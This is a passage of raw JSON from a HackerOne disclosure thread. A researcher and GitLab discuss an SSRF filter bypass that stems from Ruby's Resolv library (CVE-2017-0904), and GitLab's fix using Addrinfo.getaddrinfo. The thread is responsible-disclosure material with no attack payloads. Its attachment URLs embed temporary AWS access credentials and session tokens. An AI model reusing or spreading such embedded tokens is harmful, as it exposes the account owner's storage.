data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/236/492/19e158bd8d3f42245a71d113f61d776bab3c5012/Screenshot_from_2017-11-04_13-43-16.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2017-11-04_13-43-16.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2017-11-04_13-43-16.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ4IZIDGEJ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T045811Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHgvhPRXI%2B7x6zNGnfFbWtzZacTUlKPt3VwSApQji3YyAiEA2Y%2FuJ72LgjXuchHTkycORzGcHp9y6ZUl%2BeyKz%2FFfjlAqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDHblJHa0bCSVtoiX8yqRA7Ct%2F1l8ihdf2xXnJNUaJGv7nq%2F1b1xXdqHLpOjb5bN22Ac%2BQjHl%2Bna1KjqQx0Qu8Fcs0WQUm6dGPZbHLiP%2FRkIHh6FlY41MtajX39mvBrMgWCmioQD4vc7NSsiqHLG4GmvgnIM0wWXfwwv%2Fmq%2BjRWJQacOyz7e9kYXzI%2BQkViUKmcuV48xoXGswHYXnPSqKC6IqSk0Rgc6j2xAmne60g5PNHQf%2BehWLSoXupow19n2vF%2BE4dhw1ZLX%2B9fBct02t5%2B41MEA5z30yhC52UxDX9%2BedHi3rXpTTyV%2FX%2BWfdeGSGSqmwrTAcipCpz01NR%2Fkk3srD5BLQB%2B6BdeDlwwcltfcgYdKO39yRPNyZePA9ihdN%2B4YHA7%2FY9ufCPbEevGDvtv3mVStbES31aUOxSmGNj%2B8fMMJqFBAtD4Qx54l8UFyMf%2BQ8PPbA0OLpU9rjip1L0zxevK6IGISP%2FPlDldWsNQvfi1Xn6QvRkmL1ANNGXqycx5MDUJExPyV801VOQ68%2FfbB87Cmdd8xIJWUNtmpsIgDtMO2wqv8FOusBRxy8OOzTGCKFydY5xn2aZtaPj3obazs55j%2BS5FoY%2BdkqAuB4pbyPDlTBBI%2Fe4ZIYYBH9t51VaQaRwrhKPTTntuBcC2b5uuKcGXYq9rnIAgbUHulNqSoxgZep0wAjzrLEFeECcDfqDCjG1QyXJkGQyq3UjLElJNKzeGgK4y5hW9emXis3wfoUPLixiL7W8M52b0Q9HQrT0RxnkkNSLj7aPyOAVCPImHNwjJ%2FI2KIbB5iD4e9PbxcHFvjKgkNUQh2pESECovpzx%2BAz7wsT%2FUMRieGT%2BFtMt1o90%2BewPxe95i025ZqzwWI1aVcXtA%3D%3D\u0026amp;X-Amz-Signature=80399240ff24cf972c4358300d2e56819176acc3bece8e08fc13b2f262a55144\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/236/492/19e158bd8d3f42245a71d113f61d776bab3c5012/Screenshot_from_2017-11-04_13-43-16.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2017-11-04_13-43-16.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2017-11-04_13-43-16.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ4IZIDGEJ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T045811Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHgvhPRXI%2B7x6zNGnfFbWtzZacTUlKPt3VwSApQji3YyAiEA2Y%2FuJ72LgjXuchHTkycORzGcHp9y6ZUl%2BeyKz%2FFfjlAqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDHblJHa0bCSVtoiX8yqRA7Ct%2F1l8ihdf2xXnJNUaJGv7nq%2F1b1xXdqHLpOjb5bN22Ac%2BQjHl%2Bna1KjqQx0Qu8Fcs0WQUm6dGPZbHLiP%2FRkIHh6FlY41MtajX39mvBrMgWCmioQD4vc7NSsiqHLG4GmvgnIM0wWXfwwv%2Fmq%2BjRWJQacOyz7e9kYXzI%2BQkViUKmcuV48xoXGswHYXnPSqKC6IqSk0Rgc6j2xAmne60g5PNHQf%2BehWLSoXupow19n2vF%2BE4dhw1ZLX%2B9fBct02t5%2B41MEA5z30yhC52UxDX9%2BedHi3rXpTTyV%2FX%2BWfdeGSGSqmwrTAcipCpz01NR%2Fkk3srD5BLQB%2B6BdeDlwwcltfcgYdKO39yRPNyZePA9ihdN%2B4YHA7%2FY9ufCPbEevGDvtv3mVStbES31aUOxSmGNj%2B8fMMJqFBAtD4Qx54l8UFyMf%2BQ8PPbA0OLpU9rjip1L0zxevK6IGISP%2FPlDldWsNQvfi1Xn6QvRkmL1ANNGXqycx5MDUJExPyV801VOQ68%2FfbB87Cmdd8xIJWUNtmpsIgDtMO2wqv8FOusBRxy8OOzTGCKFydY5xn2aZtaPj3obazs55j%2BS5FoY%2BdkqAuB4pbyPDlTBBI%2Fe4ZIYYBH9t51VaQaRwrhKPTTntuBcC2b5uuKcGXYq9rnIAgbUHulNqSoxgZep0wAjzrLEFeECcDfqDCjG1QyXJkGQyq3UjLElJNKzeGgK4y5hW9emXis3wfoUPLixiL7W8M52b0Q9HQrT0RxnkkNSLj7aPyOAVCPImHNwjJ%2FI2KIbB5iD4e9PbxcHFvjKgkNUQh2pESECovpzx%2BAz7wsT%2FUMRieGT%2BFtMt1o90%2BewPxe95i025ZqzwWI1aVcXtA%3D%3D\u0026amp;X-Amz-Signature=80399240ff24cf972c4358300d2e56819176acc3bece8e08fc13b2f262a55144\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-04T12:43:56.704Z","updated_at":"2017-11-04T12:43:56.704Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":236492,"filename":"Screenshot_from_2017-11-04_13-43-16.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/236/492/19e158bd8d3f42245a71d113f61d776bab3c5012/Screenshot_from_2017-11-04_13-43-16.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2017-11-04_13-43-16.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2017-11-04_13-43-16.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4IZIDGEJ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T045811Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHgvhPRXI%2B7x6zNGnfFbWtzZacTUlKPt3VwSApQji3YyAiEA2Y%2FuJ72LgjXuchHTkycORzGcHp9y6ZUl%2BeyKz%2FFfjlAqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDHblJHa0bCSVtoiX8yqRA7Ct%2F1l8ihdf2xXnJNUaJGv7nq%2F1b1xXdqHLpOjb5bN22Ac%2BQjHl%2Bna1KjqQx0Qu8Fcs0WQUm6dGPZbHLiP%2FRkIHh6FlY41MtajX39mvBrMgWCmioQD4vc7NSsiqHLG4GmvgnIM0wWXfwwv%2Fmq%2BjRWJQacOyz7e9kYXzI%2BQkViUKmcuV48xoXGswHYXnPSqKC6IqSk0Rgc6j2xAmne60g5PNHQf%2BehWLSoXupow19n2vF%2BE4dhw1ZLX%2B9fBct02t5%2B41MEA5z30yhC52UxDX9%2BedHi3rXpTTyV%2FX%2BWfdeGSGSqmwrTAcipCpz01NR%2Fkk3srD5BLQB%2B6BdeDlwwcltfcgYdKO39yRPNyZePA9ihdN%2B4YHA7%2FY9ufCPbEevGDvtv3mVStbES31aUOxSmGNj%2B8fMMJqFBAtD4Qx54l8UFyMf%2BQ8PPbA0OLpU9rjip1L0zxevK6IGISP%2FPlDldWsNQvfi1Xn6QvRkmL1ANNGXqycx5MDUJExPyV801VOQ68%2FfbB87Cmdd8xIJWUNtmpsIgDtMO2wqv8FOusBRxy8OOzTGCKFydY5xn2aZtaPj3obazs55j%2BS5FoY%2BdkqAuB4pbyPDlTBBI%2Fe4ZIYYBH9t51VaQaRwrhKPTTntuBcC2b5uuKcGXYq9rnIAgbUHulNqSoxgZep0wAjzrLEFeECcDfqDCjG1QyXJkGQyq3UjLElJNKzeGgK4y5hW9emXis3wfoUPLixiL7W8M52b0Q9HQrT0RxnkkNSLj7aPyOAVCPImHNwjJ%2FI2KIbB5iD4e9PbxcHFvjKgkNUQh2pESECovpzx%2BAz7wsT%2FUMRieGT%2BFtMt1o90%2BewPxe95i025ZqzwWI1aVcXtA%3D%3D\u0026X-Amz-Signature=80399240ff24cf972c4358300d2e56819176acc3bece8e08fc13b2f262a55144"}],"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2137335,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@edio,\n\nI think you're seeing how difficult this problem is to solve at this level. :)\n\nWe're looking at a mix of methods now to provide comprehensive protection. Hopefully we'll get this fixed up and merged later today. I'll send you an update!","markdown_message":"\u003cp\u003e\u003ca href=\"/edio\"\u003e@edio\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eI think you\u0026#39;re seeing how difficult this problem is to solve at this level. :)\u003c/p\u003e\n\n\u003cp\u003eWe\u0026#39;re looking at a mix of methods now to provide comprehensive protection. Hopefully we\u0026#39;ll get this fixed up and merged later today. I\u0026#39;ll send you an update!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-06T16:21:23.050Z","updated_at":"2017-11-06T16:21:23.050Z","actor":{"username":"briann","cleared":false,"url":"/briann","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2137346,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @briann,\n\nThe worst thing is it turns out, because the issue stems from Ruby's native resolver this issue affects other applications. I have just bypassed multiple SSRF filters and a couple SSRF mitigation gems. All vendors and gem authors have been notified and I plan on publishing a security advisory for this issue alongside your security update this week.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/briann\"\u003e@briann\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThe worst thing is it turns out, because the issue stems from Ruby\u0026#39;s native resolver this issue affects other applications. I have just bypassed multiple SSRF filters and a couple SSRF mitigation gems. All vendors and gem authors have been notified and I plan on publishing a security advisory for this issue alongside your security update this week.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-06T16:24:26.593Z","updated_at":"2017-11-06T16:24:26.593Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2138280,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Quick update:\n\nWe have a version going through testing now that replaces the `Resolv.getaddresses()` call with a `Addrinfo.getaddrinfo()` call. This very similar to the code you mention above that uses `Socket.getaddrinfo()`. The Ruby `Addrinfo` class is a direct mapping of the underlying `struct addrinfo` used by the OS. Hopefully we can get that into a security release tomorrow. Feel free to test yourself using something like this:\n\n```\n          server_ips = Addrinfo.getaddrinfo(uri.hostname, 80, nil, :STREAM).map(\u0026:ip_address)\n```\n\nThere is a second `rescue` clause needed for strings that don't resolve. (SocketError)\n\nI think it would be a mistake to think of the Resolv library not handling these values as a bug. I would honestly expect those libraries to deal only with actual DNS queries and not get involved with lower level translations. I'll be back in touch tomorrow to let you know how things are going. Thanks again for being so patient.","markdown_message":"\u003cp\u003eQuick update:\u003c/p\u003e\n\n\u003cp\u003eWe have a version going through testing now that replaces the \u003ccode\u003eResolv.getaddresses()\u003c/code\u003e call with a \u003ccode\u003eAddrinfo.getaddrinfo()\u003c/code\u003e call. This very similar to the code you mention above that uses \u003ccode\u003eSocket.getaddrinfo()\u003c/code\u003e. The Ruby \u003ccode\u003eAddrinfo\u003c/code\u003e class is a direct mapping of the underlying \u003ccode\u003estruct addrinfo\u003c/code\u003e used by the OS. Hopefully we can get that into a security release tomorrow. Feel free to test yourself using something like this:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e          server_ips = Addrinfo.getaddrinfo(uri.hostname, 80, nil, :STREAM).map(\u0026amp;:ip_address)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThere is a second \u003ccode\u003erescue\u003c/code\u003e clause needed for strings that don\u0026#39;t resolve. (SocketError)\u003c/p\u003e\n\n\u003cp\u003eI think it would be a mistake to think of the Resolv library not handling these values as a bug. I would honestly expect those libraries to deal only with actual DNS queries and not get involved with lower level translations. I\u0026#39;ll be back in touch tomorrow to let you know how things are going. Thanks again for being so patient.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-06T21:18:36.807Z","updated_at":"2017-11-06T21:18:36.807Z","actor":{"username":"briann","cleared":false,"url":"/briann","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2139763,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @briann,\n\nThis is great to hear! Concerning your final statement, this is a bug and is actually documented here: https://docs.ruby-lang.org/en/2.4.0/Resolv.html#class-Resolv-label-Bugs. I am not particularly satisfied with those two little bullet points, I would expect a clear warning somewhere in the docs similar to how the Python docs do it.\n\nAlso I have finally discovered where the empty value is returned:\n\n```ruby\n# File lib/resolv.rb, line 100\ndef getaddresses(name)\n ret = []\n each_address(name) {|address| ret \u003c\u003c address}\n return ret\nend\n```\n\nThe Ruby Core dev team have responded to my report and we are currently discussing the issue. I will keep you updated.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/briann\"\u003e@briann\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThis is great to hear! Concerning your final statement, this is a bug and is actually documented here: \u003ca title=\"https://docs.ruby-lang.org/en/2.4.0/Resolv.html#class-Resolv-label-Bugs\" href=\"/redirect?url=https%3A%2F%2Fdocs.ruby-lang.org%2Fen%2F2.4.0%2FResolv.html%23class-Resolv-label-Bugs\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://docs.ruby-lang.org/en/2.4.0/Resolv.html#class-Resolv-label-Bugs\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. I am not particularly satisfied with those two little bullet points, I would expect a clear warning somewhere in the docs similar to how the Python docs do it.\u003c/p\u003e\n\n\u003cp\u003eAlso I have finally discovered where the empty value is returned:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight ruby\"\u003e\u003ccode\u003e\u003cspan class=\"c1\"\u003e# File lib/resolv.rb, line 100\u003c/span\u003e\n\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003egetaddresses\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n \u003cspan class=\"n\"\u003eret\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[]\u003c/span\u003e\n \u003cspan class=\"n\"\u003eeach_address\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"n\"\u003eaddress\u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e \u003cspan class=\"n\"\u003eret\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e \u003cspan class=\"n\"\u003eaddress\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003eret\u003c/span\u003e\n\u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe Ruby Core dev team have responded to my report and we are currently discussing the issue. I will keep you updated.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-07T10:11:05.078Z","updated_at":"2017-11-07T10:11:05.078Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2140823,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The bug in `Resolv::getaddresses` has been assigned [CVE-2017-0904](http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-0904).","markdown_message":"\u003cp\u003eThe bug in \u003ccode\u003eResolv::getaddresses\u003c/code\u003e has been assigned \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.cve.mitre.org%2Fcgi-bin%2Fcvename.cgi%3Fname%3D2017-0904\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eCVE-2017-0904\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-07T17:22:45.083Z","updated_at":"2017-11-07T17:22:45.083Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2141642,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Ah, that's good to know. I'm used to lower level programming myself, where libraries have a more specific purpose. In the meantime we've switched over to the other library. \n\nOur security release didn't quite make it out today but will certainly go out tomorrow. I hope that gives you enough time to reference it in your announcement later this week.","markdown_message":"\u003cp\u003eAh, that\u0026#39;s good to know. I\u0026#39;m used to lower level programming myself, where libraries have a more specific purpose. In the meantime we\u0026#39;ve switched over to the other library. \u003c/p\u003e\n\n\u003cp\u003eOur security release didn\u0026#39;t quite make it out today but will certainly go out tomorrow. I hope that gives you enough time to reference it in your announcement later this week.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-07T23:01:49.809Z","updated_at":"2017-11-07T23:01:49.809Z","actor":{"username":"briann","cleared":false,"url":"/briann","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2144880,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi again @edio,\n\nA patch for this vulnerability was included in our 10.1.2 security release earlier today.\n\nhttps://about.gitlab.com/2017/11/08/gitlab-10-dot-1-dot-2-security-release/\n\nThanks again for the report!","markdown_message":"\u003cp\u003eHi again \u003ca href=\"/edio\"\u003e@edio\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eA patch for this vulnerability was included in our 10.1.2 security release earlier today.\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://about.gitlab.com/2017/11/08/gitlab-10-dot-1-dot-2-security-release/\" href=\"/redirect?url=https%3A%2F%2Fabout.gitlab.com%2F2017%2F11%2F08%2Fgitlab-10-dot-1-dot-2-security-release%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://about.gitlab.com/2017/11/08/gitlab-10-dot-1-dot-2-security-release/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThanks again for the report!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-09T02:52:50.043Z","updated_at":"2017-11-09T02:52:50.043Z","actor":{"username":"briann","cleared":false,"url":"/briann","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"edoverflow","url":"/edoverflow"},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2144881,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-11-09T02:57:40.805Z","updated_at":"2017-11-09T02:57:40.805Z","first_to_agree":true,"actor":{"username":"briann","cleared":false,"url":"/briann","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2146887,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Hi @briann,\n\nFantastic work! Here is my write-up: https://edoverflow.com/2017/ruby-resolv-bug/.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/briann\"\u003e@briann\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eFantastic work! Here is my write-up: \u003ca title=\"https://edoverflow.com/2017/ruby-resolv-bug/\" href=\"/redirect?url=https%3A%2F%2Fedoverflow.com%2F2017%2Fruby-resolv-bug%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://edoverflow.com/2017/ruby-resolv-bug/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-09T17:51:58.162Z","updated_at":"2017-11-09T17:51:58.162Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2146888,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-11-09T17:51:58.358Z","updated_at":"2017-11-09T17:51:58.358Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2146927,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"\"ResolvBleed\", eh? :)","markdown_message":"\u003cp\u003e\u0026quot;ResolvBleed\u0026quot;, eh? :)\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-09T18:07:14.730Z","updated_at":"2017-11-09T18:07:14.730Z","actor":{"username":"briann","cleared":false,"url":"/briann","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}